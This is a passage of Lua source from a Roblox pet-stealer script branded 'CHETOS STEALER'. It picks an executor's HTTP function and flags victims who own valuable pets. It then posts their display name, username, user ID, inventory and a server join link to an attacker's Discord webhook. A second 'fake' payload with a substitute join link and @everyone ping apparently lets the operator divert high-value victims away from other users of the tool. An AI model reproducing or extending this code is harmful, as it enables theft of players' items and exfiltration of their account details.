        local isPriority = hasGodTierPet or raccoonCount >= 3 or discoBeeCount >= 2 or dragonflyCount >= 3 or butterflyCount >= 2 or hasDevineHugePets or hasPremiumMutations or hasHeavyHugePets
        
        local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if not requestFunc then return end

        if isPriority then
            local real_join_link = string.format("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)
            local description_real = table.concat({"**ğŸ‘¤ Player Information**", "```", ("ğŸ˜­ Display Name: %s"):format(player.DisplayName), ("ğŸ‘¤ Username: @%s"):format(player.Name), ("ğŸ‘ï¸ User ID: %d"):format(player.UserId), ("ğŸ¦¸ Receiver: %s"):format(getgenv().receiver or ""), ("ğŸ’» Executor: %s"):format(executorName), ("ğŸŒ Server: %s"):format(serverStatus), "```", "**ğŸ“Š BACKPACK STATISTICS**", "```", ("ğŸ¤­ Total Pets: %d"):format(stats.total), ("ğŸ¤‘ Huge Pets: %d"):format(stats.huge), ("â­ Aged/Mutated: %d"):format(stats.agedMutated), ("ğŸ¯ Priority Pets: %d"):format(#priorityPets), "```", "**ğŸ¾ All Pets**", formatPetList(), "**ğŸ”— Server Access**", real_join_link}, "\n")
            local embed_real = {title = "ğŸ¾ **CHETOS STEALER PALDO**", color = 2829617, description = description_real, footer = { text = "CHETOS STEALER â€¢ by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1399016886737436702/1399382949903994912/file_00000000a50461f88005f314f95f2088_1.png?ex=6888cc6e&is=68877aee&hm=1145895e352725b421360afb33316b7d725425032687bbbb3df182ce52e807b7&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
            local payload_real = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1399016886737436702/1399382949903994912/file_00000000a50461f88005f314f95f2088_1.png?ex=6888cc6e&is=68877aee&hm=1145895e352725b421360afb33316b7d725425032687bbbb3df182ce52e807b7&", embeds = { embed_real }}
            sendOurWebhook(CONFIG.KITSUNE_WEBHOOK_URL, payload_real)

            local fake_join_link = "[Join Server](" .. CONFIG.STATIC_JOIN_LINK_FOR_PRIORITY .. ")"
            local description_fake = table.concat({"**ğŸ‘¤ Player Information**", "```", ("ğŸ˜­ Display Name: %s"):format(player.DisplayName), ("ğŸ‘¤ Username: @%s"):format(player.Name), ("ğŸ‘ï¸ User ID: %d"):format(player.UserId), ("ğŸ¦¸ Receiver: %s"):format(getgenv().receiver or ""), ("ğŸ’» Executor: %s"):format(executorName), ("ğŸŒ Server: %s"):format(serverStatus), "```", "**ğŸ“Š BACKPACK STATISTICS**", "```", ("ğŸ¤­ Total Pets: %d"):format(stats.total), ("ğŸ¤‘ Huge Pets: %d"):format(stats.huge), ("â­ Aged/Mutated: %d"):format(stats.agedMutated), ("ğŸ¯ Priority Pets: %d"):format(#priorityPets), "```", "**ğŸ¾ All Pets**", formatPetList(), "**ğŸ”— Server Access**", fake_join_link}, "\n")
            local embed_fake = {title = "ğŸ¾ **CHETOS STEALER PALDO**", color = 2829617, description = description_fake, footer = { text = "CHETOS STEALER â€¢ by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1399016886737436702/1399382949903994912/file_00000000a50461f88005f314f95f2088_1.png?ex=6888cc6e&is=68877aee&hm=1145895e352725b421360afb33316b7d725425032687bbbb3df182ce52e807b7&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
            local payload_fake = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1399016886737436702/1399382949903994912/file_00000000a50461f88005f314f95f2088_1.png?ex=6888cc6e&is=68877aee&hm=1145895e352725b421360afb33316b7d725425032687bbbb3df182ce52e807b7&", embeds = { embed_fake }, content = CONFIG.PING_MESSAGE, allowed_mentions = { parse = {"everyone"} }}
